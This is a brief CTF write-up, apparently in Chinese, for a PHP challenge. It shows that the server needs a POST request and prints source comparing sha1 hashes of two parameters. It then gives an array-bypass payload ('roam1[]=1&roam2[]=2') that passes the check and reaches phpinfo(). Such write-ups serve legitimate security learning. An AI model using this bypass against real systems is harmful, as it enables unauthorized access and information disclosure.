# [极客大挑战 2020]Roamphp1-Welcome
![](<./img/Pasted image 20230215112137.png>)

```
/
```

![](<./img/Pasted image 20230215112320.png>)

嗯？

![](<./img/Pasted image 20230215112339.png>)

尝试`POST`

```php
<?php
error_reporting(0);
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
header("HTTP/1.1 405 Method Not Allowed");
exit();
} else {
    
    if (!isset($_POST['roam1']) || !isset($_POST['roam2'])){
        show_source(__FILE__);
    }
    else if ($_POST['roam1'] !== $_POST['roam2'] && sha1($_POST['roam1']) === sha1($_POST['roam2'])){
        phpinfo();  // collect information from phpinfo!
    }
}
```

简单的数组绕过

```
roam1[]=1&roam2[]=2
```

![](<./img/Pasted image 20230215114149.png>)
